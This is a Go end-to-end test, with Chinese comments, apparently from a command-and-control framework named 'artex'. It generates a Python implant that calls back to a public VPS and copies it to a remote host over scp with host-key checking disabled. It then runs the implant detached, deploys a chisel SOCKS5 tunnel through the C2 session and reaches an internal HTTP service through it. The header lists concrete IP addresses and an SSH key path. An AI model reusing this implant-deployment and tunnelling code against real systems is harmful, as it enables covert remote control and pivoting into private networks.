package server

// C2 -> chisel 隧道公网真机 E2E（默认 skip）：纯 C2 TCP 会话（无 SSH）作为控制面，
// 经 C2 任务上传/拉起 chisel 客户端，再由 tunnel.Manager 建 SOCKS5 数据面。
//
//	ARTEX_PG_DSN=... ARTEX_C2_TOKEN=... \
//	ARTEX_C2_PUBLIC_VPS_ADDR=39.89.211.55:39444 ARTEX_C2_VPS_SSH=root@113.20.3.124 \
//	ARTEX_C2_VPS_KEY=~/.ssh/id_ed25519_113.20.3.124 \
//	ARTEX_CHISEL_PATH=... ARTEX_CHISEL_CLIENT_DIR=... \
//	ARTEX_TUNNEL_CALLBACK_HOST=39.89.211.55 \
//	go test ./server -run TestC2TunnelPublicVPS -v -timeout 420s
//
// 端口约定：C2 TCP 监听 39444（公网映射），chisel server 固定 39443（公网映射）。

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/artex/c2"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/session"
	"github.com/Autumn-27/artex/stage"
	"github.com/Autumn-27/artex/tunnel"
)

func TestC2TunnelPublicVPS(t *testing.T) {
	dsn := strings.TrimSpace(os.Getenv("ARTEX_PG_DSN"))
	token := strings.TrimSpace(os.Getenv("ARTEX_C2_TOKEN"))
	publicAddr := strings.TrimSpace(os.Getenv("ARTEX_C2_PUBLIC_VPS_ADDR"))
	vps := strings.TrimSpace(os.Getenv("ARTEX_C2_VPS_SSH"))
	keyPath := strings.TrimSpace(os.Getenv("ARTEX_C2_VPS_KEY"))
	chiselPath := strings.TrimSpace(os.Getenv("ARTEX_CHISEL_PATH"))
	clientDir := strings.TrimSpace(os.Getenv("ARTEX_CHISEL_CLIENT_DIR"))
	callback := strings.TrimSpace(os.Getenv("ARTEX_TUNNEL_CALLBACK_HOST"))
	if dsn == "" || token == "" || publicAddr == "" || vps == "" || keyPath == "" || chiselPath == "" || clientDir == "" || callback == "" {
		t.Skip("需要 ARTEX_PG_DSN/ARTEX_C2_TOKEN/ARTEX_C2_PUBLIC_VPS_ADDR/ARTEX_C2_VPS_SSH/ARTEX_C2_VPS_KEY/ARTEX_CHISEL_PATH/ARTEX_CHISEL_CLIENT_DIR/ARTEX_TUNNEL_CALLBACK_HOST")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 390*time.Second)
	defer cancel()
	d, err := db.Open(dsn)
	if err != nil {
		t.Fatalf("open db: %v", err)
	}
	defer d.Close()
	store := db.NewC2Store(d, []byte("c2-tunnel-e2e-master"))
	rt := &c2Runtime{store: store, mgr: c2.NewManager(token), dbToMgr: map[int64]int64{}, mgrToDB: map[int64]int64{}}
	rt.mgr.SetEventHandler(rt.onManagerEvent)
	const lport = 39444
	lid, err := store.CreateListener(ctx, &db.C2Listener{Name: "c2-tunnel-e2e", Kind: "tcp", BindHost: "0.0.0.0", BindPort: lport, Token: token})
	if err != nil {
		t.Fatalf("create c2 listener: %v", err)
	}
	t.Cleanup(func() { _ = store.DeleteListener(context.Background(), lid) })
	mgrID, bound, err := rt.mgr.Start(ctx, fmt.Sprintf("0.0.0.0:%d", lport))
	if err != nil {
		t.Fatalf("start c2 listener: %v", err)
	}
	rt.dbToMgr[lid] = mgrID
	rt.mgrToDB[mgrID] = lid
	defer rt.mgr.StopAll()
	t.Logf("c2 tcp listener=%s", bound)

	ssh := func(cmd string) (string, error) {
		c := exec.Command("ssh", "-i", keyPath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", vps, cmd)
		out, err := c.CombinedOutput()
		return string(out), err
	}
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatal(err)
	}
	implantID := fmt.Sprintf("c2-tunnel-%d", time.Now().UnixNano())
	script := c2.PythonImplant(publicAddr, token, base64.StdEncoding.EncodeToString(key), implantID)
	local := "/tmp/c2_tunnel_implant.py"
	remote := "/tmp/c2_tunnel_implant.py"
	if err := os.WriteFile(local, []byte(script), 0o600); err != nil {
		t.Fatal(err)
	}
	if out, err := exec.Command("scp", "-i", keyPath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", local, vps+":"+remote).CombinedOutput(); err != nil {
		t.Fatalf("scp implant: %v %s", err, out)
	}
	defer func() {
		_, _ = ssh("pkill -f c2_tunnel_implant 2>/dev/null; rm -f /tmp/c2_tunnel_implant.py /tmp/c2_tunnel_implant.log")
	}()
	if _, err := ssh("setsid -f python3 /tmp/c2_tunnel_implant.py >/tmp/c2_tunnel_implant.log 2>&1; echo started"); err != nil {
		t.Fatalf("run implant: %v", err)
	}
	var sess *db.C2Session
	deadline := time.Now().Add(40 * time.Second)
	for time.Now().Before(deadline) {
		list, lerr := store.ListSessions(ctx, true)
		if lerr == nil {
			for _, x := range list {
				if x.ListenerID == lid {
					sess = x
					break
				}
			}
		}
		if sess != nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if sess == nil {
		logs, _ := ssh("tail -20 /tmp/c2_tunnel_implant.log 2>&1")
		t.Fatalf("c2 tcp session not online; vps log=%s", logs)
	}
	t.Logf("c2 session online id=%d remote=%s", sess.ID, sess.RemoteAddr)
	adapter, err := newC2TunnelSession(rt, ctx, sess.ID)
	if err != nil {
		t.Fatalf("adapter: %v", err)
	}
	if err := adapter.Test(ctx); err != nil {
		t.Fatalf("adapter test: %v", err)
	}
	stageMgr, err := stage.New(ctx, t.TempDir())
	if err != nil {
		t.Fatalf("stage: %v", err)
	}
	tmgr, err := tunnel.NewManager(tunnel.Options{
		Store: db.NewTunnelStore(d), Stage: stageMgr, Sessions: session.NewRegistry(),
		ChiselPath: chiselPath, ChiselClientDir: clientDir, DataDir: t.TempDir(),
	})
	if err != nil {
		t.Fatalf("tunnel manager: %v", err)
	}
	plan, err := tunnel.PlanSocks(&tunnel.PlanOpts{
		TaskID: 1, ListenHost: "0.0.0.0", ListenPort: 39443,
		CallbackHost: callback, PortMin: 20000, PortMax: 20100, CanListen: tunnel.CanListen,
		DataDir: tmgr.PlanDataDir(),
	})
	if err != nil {
		t.Fatalf("plan: %v", err)
	}
	plan.ViaC2SessionID = sess.ID
	plan.Adapter = tunnel.AdapterChisel
	rec, err := tmgr.DeployWithSession(ctx, plan, adapter)
	if err != nil {
		t.Fatalf("deploy via c2: %v", err)
	}
	t.Logf("tunnel via c2 alive id=%d state=%s socks=%d listen=%d", rec.ID, rec.State, plan.SocksPort, plan.ListenPort)
	if _, _, err := adapter.Exec(ctx, "cd /tmp && setsid -f python3 -m http.server 18082 --bind 127.0.0.1 >/tmp/c2tun_target.log 2>&1", 20*time.Second); err != nil {
		t.Fatalf("target http: %v", err)
	}
	defer func() {
		_, _, _ = adapter.Exec(context.Background(), "pkill -f 'http.server 18082' 2>/dev/null; true", 10*time.Second)
	}()
	entry := tmgr.EntryAddr(plan)
	conn, err := dialSocks5C2Test(entry, "127.0.0.1:18082", 10*time.Second)
	if err != nil {
		t.Fatalf("socks dial: %v", err)
	}
	defer conn.Close()
	_, _ = io.WriteString(conn, "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
	line, _ := bufio.NewReader(conn).ReadString('\n')
	if !strings.Contains(line, "200") {
		t.Fatalf("unexpected target response: %q", line)
	}
	t.Logf("c2 -> chisel socks ok entry=%s target_status=%s", entry, strings.TrimSpace(line))
	if err := tmgr.Teardown(ctx, rec.ID); err != nil {
		t.Logf("teardown warning: %v", err)
	}
}

func dialSocks5C2Test(entry, target string, timeout time.Duration) (net.Conn, error) {
	c, err := net.DialTimeout("tcp", entry, timeout)
	if err != nil {
		return nil, err
	}
	_ = c.SetDeadline(time.Now().Add(timeout))
	if _, err := c.Write([]byte{5, 1, 0}); err != nil {
		_ = c.Close()
		return nil, err
	}
	buf := make([]byte, 2)
	if _, err := io.ReadFull(c, buf); err != nil {
		_ = c.Close()
		return nil, err
	}
	host, portStr, err := net.SplitHostPort(target)
	if err != nil {
		_ = c.Close()
		return nil, err
	}
	port := 0
	if _, err := fmt.Sscanf(portStr, "%d", &port); err != nil {
		_ = c.Close()
		return nil, err
	}
	req := []byte{5, 1, 0, 1}
	ip := net.ParseIP(host).To4()
	if ip == nil {
		_ = c.Close()
		return nil, fmt.Errorf("target host must be ipv4")
	}
	req = append(req, ip...)
	req = append(req, byte(port>>8), byte(port))
	if _, err := c.Write(req); err != nil {
		_ = c.Close()
		return nil, err
	}
	reply := make([]byte, 10)
	if _, err := io.ReadFull(c, reply); err != nil {
		_ = c.Close()
		return nil, err
	}
	if reply[1] != 0 {
		_ = c.Close()
		return nil, fmt.Errorf("socks reply code %d", reply[1])
	}
	_ = c.SetDeadline(time.Time{})
	return c, nil
}
